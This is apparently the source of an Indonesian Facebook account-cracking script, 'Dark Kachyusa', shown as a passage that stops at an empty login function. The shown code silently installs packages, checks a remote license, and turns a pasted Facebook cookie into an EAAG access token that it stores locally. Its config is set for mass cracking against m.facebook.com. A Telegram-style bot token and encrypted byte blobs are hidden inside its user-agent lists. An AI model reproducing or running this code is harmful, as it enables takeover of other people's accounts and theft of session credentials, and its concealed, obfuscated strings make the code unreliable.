# print ( ' __main__(bot_efbe) ' ):
# print('Jangan Ganti Bot Cooment Gw')
# print('Anggap Saja Sebagai Tanda Terima Kasih') 
# print('Karena Gw Udah Ngilangin Bagian Yang Error Di Script Ini')
# print('  [ Denventa Afriliyan Ferly Shishigami X ]  ')

#=======================================[IMPORT]=======================================#
                 # print('  [ Denventa Afriliyan Ferly Shishigami X ]  ')
try:
	import sys,os
	for x in range(10):
		try:
			import rich
			import requests
			import bs4
			import stdiomask
			import mechanize
			import inquirer
			import pprint
			import pystyle
			import blessed
			import fake_useragent
		except ImportError as e:
			print(f"* Sedang Install Bahan {e.name}, Mohon Bersabar....")
			os.system(f"python -m pip install {e.name} &> /dev/null")
	import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
	import sys, os, subprocess, platform, struct
	import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json
	import requests as req
	import time,random,json
	import inquirer,os,sys,re
	from inquirer import errors
	from inquirer.themes import GreenPassion
	from rich.table import Table as me
	from rich.console import Console as sol
	from rich.console import Group as gp
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.markdown import Markdown as mark
	from rich.columns import Columns as col
	from rich import print as iprint
	from rich.panel import Panel
	from rich.tree import Tree
	from rich import print as rprint
	from rich.text import Text
	from rich.progress import track
	from rich import print as prints
	from rich.console import Console
	from rich.table import Table
	from rich.columns import Columns
	from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
	from rich.progress import Task
	from rich.progress import DownloadColumn,SpinnerColumn,TransferSpeedColumn
	from rich import filesize, get_console
	from rich.console import Group
	from rich.markdown import Markdown
	from rich.panel import Panel
	from rich.syntax import Syntax
	from rich.table import Table
	from rich.box import DOUBLE, ROUNDED
	from rich.padding import Padding
	from rich.box import ROUNDED, Box
	from requests.exceptions import ConnectionError
	from bs4 import BeautifulSoup
	from bs4 import BeautifulSoup as parser
	from bs4 import BeautifulSoup as par
	from random import choice as pilih
	from concurrent.futures import ThreadPoolExecutor as __Ferly__
	from concurrent.futures import ThreadPoolExecutor
	from requests.exceptions import ConnectionError
	from datetime import datetime
	from urllib.parse import quote
	from datetime import date
	from urllib import request
	from pprint import pprint
	from pystyle import *
	from blessed import Terminal
	from datetime import datetime
	from requests import ConnectionError
	from threading import Event
	from fake_useragent import UserAgent
	from inquirer.themes import Default
	from concurrent.futures import ThreadPoolExecutor
	from datetime import datetime
	console = Console()
	try:
		null = open(os.devnull, "w")
		insta = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
		if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
		null.close()
		musik_="play"
	except:musik_="error!!"
	sys.stdout.write(f'\x1b[1;35m\x1b]2; Developer Script : Denventa\x07')
	sys.path.append(os.path.realpath('.'))
except requests.exceptions.ConnectionError:
	print("* Perisak Jaringan Anda..!!");quit()

mytok = []
#"""WARNA RICH"""
H = "#000000" # Hitam
M = "#FF0000" # Merah
I = "#00FF00" # Hijau
K = "#FFFF00" # Kuning
B = "#00C8FF" # Biru
U = "#AF00FF" # Ungu
P = "#FF00FF" # Pink
C = "#00FFFF" # Biru Muda
Q = "#FFFFFF" # Putih
J = "#FF8F00" # Jingga
A = "#AAAAAA" # Abu-Ab
O = "#FFA500" # OREN
HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN

#""" WARNA UNTUK PRINT"""
q='\x1b[0m'	 # WARNA MATI
p = '\x1b[0;97m' # PUTIH
m = '\x1b[0;91m' # MERAH
i = '\x1b[0;92m' # HIJAU
k = '\x1b[0;93m' # KUNING
k = '\033[0;93m' # KUNING
b = '\x1b[0;94m' # BIRU
u = '\x1b[0;95m' # UNGU
c = '\033[0;96m' # BIRU MUDA
h = "\x1b[0;90m"     # Hitam
j = "\x1b[38;5;208m" # Jingga
a = "\x1b[38;5;248m" # Abu-Abu
o='\033[38;2;255;127;0;1m' #ORANGE
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
garis="\033[4m\033[3m"
jarak=(f"────────────────────────────────────────────────────────────────────────────────────────{q}")
#=======================================[GLOBAL-TEXT]==================================#
#""" TANGGAL"""
current = datetime.now()
hari = current.day
bulan_number = current.month
nama_bulan= {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#bulan = nama_bulan[str(bulan_number)]
tahun = current.year
all_day=(f"{hari}-{tahun}")

#""" WAKTU(JAM)"""
detik = datetime.now().strftime('%H')
menit = datetime.now().strftime('%M')
jam = datetime.now().strftime('%S')
all_waktu=(f"{detik}-{menit}-{jam}")

#""" GET VISITOR"""
try:
	visitor=request.urlopen("https://api.countapi.xyz/hit/denventa/dark-kachyusa")
	ka=json.loads(visitor.read())
except:pass

# Config
#try:xtc = open("config.json","r")
#except:os.sys.exit("* Error DiBagian 186")

xtc = 	{
	"warna" : {
		"tabel" : "[#AAAAAA]",
		"rich"	: "#AAAAAA",
	},
	"setting_crack" : {
		"max-crack" : 35,
		"domain"    : "m.facebook.com"
	}
}
#try:
#	codeteam = json.loads(open(".data/sensi.json","r").read())
#except:os.sys.exit("*Error Dibagian codeteam")
#codeteam = json.loads(open(".data/sensi.json","r").read())


WAR = f"   {QQ}[{MM}!!{QQ}] "
WIR = f"   {QQ}[{KK}??{QQ}] "
WOR = f"   {QQ}[{II}++{QQ}] "
GOD = f"{QQ}•{II}•{MM}•{QQ}"
war = f"   {q}[{m}!!{q}] "
wir = f"   {q}[{k}??{q}] "
wor = f"   {q}[{i}++{q}] "
god = f"{q}•{i}•{m}•"
yyy = "Kontol"

###----------[ USER AGENT ]---------- ###
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjg","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua09= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0",b'rJLw2/F3v0PfZ+F88lY2OO393v/jb/tn/9E8UqHfu+y5+fXQtMyf623eEXAumpu77SWYBSAkbzDsNmOGxO4qRbL4bSRcNzAYvVmnUoEh9s1SzlaPvdVYJOarnmlFTEPf6FKmEZwkS4hkdrFrJL9yMk4kSf8SjmhF1uswHbWNjoCTvTbCRXnJiUJidV8K0aCguz14iRl9Xw9Q76KAGt6m4xH3sckRYqgcrIu5wOJIhbKd5LKwmEB4WSbyFjrpgirsOaVMR7cWgAUclQdxNWZL+VLAQpNt3V4OtBUTFa2bfxkz4EUw2k/FNp3wjXia+fANSlCB0joFGzZiX/w9kPEEKoUkDQneV1ngvvZCTbA3gxeroxHtKIku/F6walDbrB7RVPyu04SpZ2rqSJmw87EmfaR/DfDylxjbV7QyBO/eTuTVHwloayU0cnouKV9Qer3mlPbtAe/KoAUcG40b2afoMPZ5VJq+P0jlXC0o5r+QrPH1Wxjz3HXGw2TWH6CjqcCtgL56PfVPppkZaSoGuoIlFrIYGvvDLvthj75bV/0ry9BMn75T57j58MChDtc1H8Yw53+/x9wxg3r6/C94ZxROynyKj7Edi2cQgK5CG5eixFCaQjEEop9Apkqqa2EiBQhx5OcgGHWRAA0mSmjkdxJe',"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua05= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua06= ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
ua_nokia   = 'Mozilla/5.0 (Linux; Android 5.1; iris605 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/286.0.0.5.105;]'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 5.1; vivo Y21 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A536 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.47 Mobile Safari/537.36'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
ua_chrome  = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/112.0.0.0 Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
ua_sony    = 'Mozilla/5.0 (Linux; Android 11; J9110 Build/55.2.A.4.332; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.22 Mobile Safari/537.36 open_news open_news_u_s/4509'
ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb,ua_sony])
status_key = ""
id_c=[]
id = []
sos = []
ok = []
cp = []
loop = 0
follow_id = []
ugen=[]
pass_ = ""
pass_t= ""
method=""

#=======================================[CLASS-DEF]====================================#
class cls:
	def __init__(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear")
			except:pass
class folder:
	def __init__(self):
		try:os.mkdir(".data")
		except:pass
		try:os.mkdir("results")
		except:pass
		try:
			open(".data/user-baru.txt","r").read()
		except:
			open(".data/user-baru.txt","w").write("HALO-JIKA-ANDA-HAPUS-FILE-INI-ANDA-AKAN-MENAMPILKAN-PENGGUNA-BARU\nSALAM-DARI-[ Denventa ]")
			text = Text(f"""Sepertinya Anda Pengguna Baru Script [ Dark Kachyusa ], Terima Kasih Telah Menggunakan Sciprt Saya, Dan Terima Kasih Telah Mempercayai Saya, Saya Akan Memberikan Pengalaman Kepada Anda Untuk Crack Secara Maksimal, Salam Dari Saya [ Denventa ] And XAYONARA•CODETEAM""")
			text.highlight_words(["Pengguna Baru Script [ Dark Kachyusa ]"],"bold yellow")
			text.highlight_words(["Terima Kasih","Mempercayai Saya"], "bold green")
			text.highlight_words(["[ Denventa ]","XAYONARA•CODETEAM","Maksimal"], "italic white")
			console.rule("Information Pengguna Baru",style="red")
			console.print(text, style="cyan", justify="center")
def menu_belum_ada():
	text = Text(f"""Sepertinya Menu Yang Anda Pilih Masih Tahap Perkembangan (Belum Tersedia)\nMohon Kerja Samanya....""")
	text.highlight_words(["Mohon Kerja Samanya"], "bold green")
	text.highlight_words(["Belum Tersedia"], "bold red")
	console.rule("Information Menu",style="red")
	console.print(text, style="cyan", justify="center")
	time.sleep(3)

def quit():
	exit()
	os.sys.exit()
	quit()
codeteam = ""
def globalz():
	global codeteam
	try:codeteam = json.loads(open(".data/sensi.json","r").read())
	except:open(".data/sensi.json","w").write('{\n\t"token":"%s",\n\t"cookie":"%s",\n\t"nama":"KONTOL",\n\t"KEY":"Member"}'%("",""))
def kata_free():
	prints(Panel(f"{WAR}{PP}Maaf Menu Yang Anda Pilih, Hanya User Admin !..\n{WAR}{QQ}Apakah Anda Mau Login User Admin ?",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏PILIH [{II}Y{QQ}/{MM}n{QQ}]"));time.sleep(3)
	hu = input(f"{a}   ┗{k}PILIH: {a}")
	if hu == "Y" or hu == "y":login_key()
	elif hu == "n" or hu == "N":quit()
	else:kata_free()
def login_key():
	global status_key
	cls();logo()
	tampilan_key = f"""{WOR}{QQ}Masukan Nama Dan Key Anda Untuk Verifikasi Data User Admin,
{WAR}{QQ}Nama Dan Key Hanya Dapat Orang Tertentu !!
{WAR}{PP}Nama Dan Key Tidak Bisa DiBeli Oleh Member Biasa !!"""
	prints(Panel(tampilan_key,width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏ISI DATA ANDA"))
	nama_saya = input(f"{a}   ┗{k}NAMA ANDA : {a}")
	key_saya  = input(f"{a}   ┗{k}KEY ANDA  : {a}")
	dmz = requests.get("https://raw.githubusercontent.com/m4ypr0j3k/server/main/license.json").json()
	try:
		my_key = dmz[f"{nama_saya}"]
		if my_key == key_saya:
			mmk = json.loads(open(".data/sensi.json","r").read())
			mmz = open(".data/sensi.json","r").read()
			ubah_kukis = mmz.replace(mmk["nama"], nama_saya)
			ubah_kukis = ubah_kukis.replace(mmk["KEY"], key_saya)
			open(".data/sensi.json","w").write(ubah_kukis)
			print(f"{wor}{i}Berhasil Login User Admin...\n{wor}{o}Nama : {q}{nama_saya}\n{wor}{o}Key  : {q}{key_saya}")
			status_key=("Admin")
			globalz()
			quit()
			quit()
			exit()
		else:
			status_key=("Member")
			print(f"{wor}{m}Gagal Login User Admin...\n{wor}{o}Nama : {q}{nama_saya}\n{wor}{o}Key  : {q}{key_saya}");time.sleep(2)
			quit()
	except Exception as e:
		print(f"{wor}{m}Gagal Login User Admin...")
		print(str(e));time.sleep(3)
		login_key()
	quit()
	quit()
def cek_key():
	global status_key
	try:
		nama_saya = str(codeteam["nama"])
		key_saya  = codeteam["KEY"]
		dmz = requests.get("https://raw.githubusercontent.com/m4ypr0j3k/server/main/license.json").json()
		try:
			my_key = dmz[f"{nama_saya}"]
			if my_key == key_saya:
				globalz()
				status_key=("Admin")
			else:
				status_key=("Member")
				print(f"{wor}{m}Gagal Login User Admin...\n{wor}{o}Nama : {q}{nama_saya}\n{wor}{o}Key  : {q}{key_saya}");time.sleep(2)
				quit()
		except:
			status_key=("Member")
			print(f"{wor}{m}Gagal Login User Admin...")

	except Exception as e:
		print(f"{wor}{m}Gagal Login User Admin...")
		print(str(e));time.sleep(3)
		login_key()



class logo:
	def __init__(self):
		my_logo = f"""{MM} ____   _____  _____  _____    {QQ}_____  _____  _____  _____  _____  _____  _____  _____
{MM}|    \ |  _  || __  ||  |  |  {QQ}|   __||  _  ||     ||   __|| __  ||     ||     ||  |  |
{MM}|  |  ||     ||    -||    -|  {QQ}|   __||     ||   --||   __|| __ -||  |  ||  |  ||    -|
{MM}|____/ |__|__||__|__||__|__|  {QQ}|__|   |__|__||_____||_____||_____||_____||_____||__|__|
			 {QQ}Author      : {II}Risky [ github.com/Dumai-991 ]
			 {QQ}Developer   : {II}Denventa             
			 {QQ}Github      : {II}github.com/Denventa  
			 {QQ}Facebook    : {II}Denventa Afriliyan Ferly Shishigami X"""
		prints(Panel(my_logo,width=90,padding=0,style=xtc["warna"]["rich"],title=f"{QQ}•{II}•{MM}• {OO}XAYONARA-CODETEAM {MM}•{II}•{QQ}•"))
class login:
	def __init__(self):
		i_love_you = "BUAT KALIAN RAJA DEC SEMOGA KALIAN PANJANG UMUR !!"
	def ubah_cok(self, kues):
		lol = ""
		sus = requests.Session()
		sus_ = sus.get("https://business.facebook.com/business_locations",headers = {"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kues})
		hasil_ = (re.findall("(EAAG\w+)", sus_.text))
		if len(hasil_) == 0:pass
		else:
			for token in hasil_:lol += token
		return lol
	def cek_kukis(self):
		try:
			try:codeteam = json.loads(open(".data/sensi.json","r").read())
			except:open(".data/sensi.json","w").write('{\n\t"token":"%s",\n\t"cookie":"%s",\n\t"nama":"KONTOL",\n\t"KEY":"Member"}'%("",""))
			risky = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+codeteam["token"], cookies={'cookie':codeteam["cookie"]})
			nama = json.loads(risky.text)['name']
			id = json.loads(risky.text)['id']
		except:
			prints(Panel(f"""{WAR}COOKIES ANDA ERROR!""",title=f"{GOD}COOKIES{GOD}",width=90,style=xtc["warna"]["rich"]))
#			os.remove(".data/sensi.json");time.sleep(3)
			self.menu_login()
	def login_cookies(self):
		cls();logo()
		console.print(Panel(f"{MM}[{QQ}•{MM}] {QQ}Jangan Gunakan Akun Pribadi {MM}!",width=40,title=f"{GOD}{UU}Login Cookies{GOD}",style=f"{A}",subtitle_align='left',subtitle=f"┏{KK}Masukan Cookies"))
		cookie = input(f"{a}   ┗{k}Cookies : {a}")
		token = self.ubah_cok(cookie)
		if token in (""," "):
			text = Text(f"{war}{m}Cookies Anda Error{q}({k}Invalid{q})")
			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
			console.print(text, style="red")
			quit()
		else:
			try:
				risky = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+token, cookies={'cookie':cookie})
				nama = json.loads(risky.text)['name']
				id = json.loads(risky.text)['id']
				text = Text(f"""{wor}{q}Nama Lengkap : {u}{nama}{q}\n{wor}Username/ID  : {u}{id}{q}\n{wor}{i}Token{q}        : {i}{token}{q}\n{wor}{c}Cookies{q}      : {c}{cookie}{q}""")
				console.rule("Cookies DiTemukan",style="green")
				console.print(text, style="green")
				try:
					mmk = json.loads(open(".data/sensi.json","r").read())
					mmz = open(".data/sensi.json","r").read()
					ubah_kukis = mmz.replace(mmk["cookie"], cookie)
					ubah_kukis = ubah_kukis.replace(mmk["token"], token)
					open(".data/sensi.json","w").write(ubah_kukis)
				except:open(".data/sensi.json","w").write('{\n\t"token":"%s",\n\t"cookie":"%s",\n\t"nama":"KONTOL",\n\t"KEY":"-"}'%(token,cookie))
			except Exception as e:				
#			except:
				text = Text(f"{war}{m}Cookies Anda Error{q}({k}Invalid{q}) {str(e)}");time.sleep(5)
				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
				console.print(text, style="red")
				quit()
			globalz()
			self.bot_efbe()
			quit()
#			quit()
	def login_otomatis(self):
